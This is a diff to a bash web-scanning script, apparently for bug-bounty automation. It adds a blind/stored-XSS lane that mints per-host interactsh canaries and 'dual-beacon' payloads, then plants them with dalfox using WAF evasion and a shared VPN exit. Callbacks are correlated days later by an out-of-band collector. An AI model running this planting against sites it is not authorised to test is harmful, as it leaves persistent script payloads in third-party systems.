@@ -52,6 +52,13 @@ QSREPLACE="${QSREPLACE:-$GOBIN/qsreplace}"
 DALFOX="${DALFOX:-$GOBIN/dalfox}"
 NUCLEI="${NUCLEI:-$GOBIN/nuclei}"
 
+# Blind/stored-XSS lane (recon_blindxss.sh): per-host crafted interactsh canary +
+# dual-beacon custom payload, correlated by a persistent collector. DAST_BLIND_ONLY=1
+# => PLANT only (skip nuclei + skip recording reflected findings); blind fires are
+# confirmed later by the collector/correlator, not here. The daemon's blind-plant loop
+# runs this mode; on-demand `recon-dast` (no env) runs the full reflected+dast scan.
+BLINDXSS_SH="${BLINDXSS_SH:-$SCRIPT_DIR/recon_blindxss.sh}"
+
 # Bounds
 DAST_HOSTS_PER_CYCLE="${DAST_HOSTS_PER_CYCLE:-15}"
 DAST_COOLDOWN_DAYS="${DAST_COOLDOWN_DAYS:-7}"
@@ -214,24 +221,39 @@ while IFS=$'\t' read -r host url fresh; do
   # Mining stays ON (default) — dalfox discovers params the gf/catalog set missed.
   # --waf-evasion: auto-drops to 1-worker/3s the moment a WAF is detected → protects the
   #   shared Mullvad exit from bans (the exact risk noted above) at near-zero cost otherwise.
-  # --detailed-analysis: context-aware reflection analysis → fewer FPs, more real PoCs.
-  # Opt-in env (off by default — they add request volume / need infra):
-  #   DALFOX_BLIND=<oob-callback>          → wires blind/stored-XSS (-b); set to the persistent
-  #                                           interactsh blind-xss collector once it exists.
+  # --detailed-analysis: context-aware reflection analysis → fewer FPs, more real PoCs
+  #   (skipped in blind-only planting — it adds request volume we don't need to PLANT).
+  # BLIND/STORED-XSS: recon_blindxss.sh mints a per-host crafted interactsh canary
+  #   (<CID><token>.<oast>) + a dual-beacon custom payload (interactsh callback for the
+  #   autonomous correlator + XSS Hunter probe for screenshot/DOM forensics) and records
+  #   token→host so a fire DAYS later maps back to THIS host → gated stored-XSS finding.
+  #   Falls back to the DALFOX_BLIND env if the collector isn't registered yet.
   #   DALFOX_REMOTE_PAYLOADS='portswigger,payloadbox' → broader payload set (heavier; anti-burn).
-  if [[ -n "${classfile[xss]:-}" ]]; then
-    dfx_xss=(--waf-evasion --detailed-analysis)
-    [[ -n "${DALFOX_BLIND:-}" ]]           && dfx_xss+=(-b "$DALFOX_BLIND")
+  if [[ -n "${classfile[xss]:-}" || ( -n "${DAST_BLIND_ONLY:-}" && -s "$urls" ) ]]; then
+    dfx_xss=(--waf-evasion)
+    [[ -z "${DAST_BLIND_ONLY:-}" ]] && dfx_xss+=(--detailed-analysis)
+    blindfile="$hdir/blind.txt"; bxurl=""
+    [[ -x "$BLINDXSS_SH" ]] && bxurl="$(bash "$BLINDXSS_SH" emit-payload "$host" dast "$blindfile" 2>/dev/null || true)"
+    if [[ -n "$bxurl" ]]; then
+      dfx_xss+=(-b "$bxurl" --custom-blind-xss-payload "$blindfile")
+    elif [[ -n "${DALFOX_BLIND:-}" ]]; then
+      dfx_xss+=(-b "$DALFOX_BLIND")
+    fi
     [[ -n "${DALFOX_REMOTE_PAYLOADS:-}" ]] && dfx_xss+=(--remote-payloads "$DALFOX_REMOTE_PAYLOADS")
+    # blind-only PLANTS (fires every payload incl. blind) but records nothing here — the
+    # collector/correlator confirm late fires. Feed the full param-URL set when blind-only
+    # (any stored field can surface in an admin console), else the gf-xss candidates.
+    dfx_input="${classfile[xss]:-$urls}"; dfx_sink="$host_findings"
+    [[ -n "${DAST_BLIND_ONLY:-}" ]] && dfx_sink=/dev/null
     timeout "$DALFOX_TIMEOUT" "$DALFOX" pipe --silence --no-color --skip-bav --format json \
       -w "$DALFOX_WORKERS" --delay "$DALFOX_DELAY" "${dfx_xss[@]}" \
-      < "${classfile[xss]}" 2>/dev/null \
+      < "$dfx_input" 2>/dev/null \
       | jq -c --arg host "$host" 'select(type=="object") | {host:$host, tool:"dalfox", type:(.type // "XSS"), url:(.data // .url // ""), severity:(.severity // "medium"), evidence:(.message // .poc // "")}' 2>/dev/null \
-      >> "$host_findings" || true
+      >> "$dfx_sink" || true
   fi
 
-  # --- nuclei -dast on the remaining suspicious URLs ---
-  if [[ "$NUCLEI_HAS_DAST" -eq 1 ]]; then
+  # --- nuclei -dast on the remaining suspicious URLs (skipped when blind-only planting) ---
+  if [[ "$NUCLEI_HAS_DAST" -eq 1 && -z "${DAST_BLIND_ONLY:-}" ]]; then
     nuc_in="$hdir/nuclei_urls.txt"
     cat "${classfile[@]:-/dev/null}" 2>/dev/null | sort -u > "$nuc_in"
     if [[ -s "$nuc_in" ]]; then
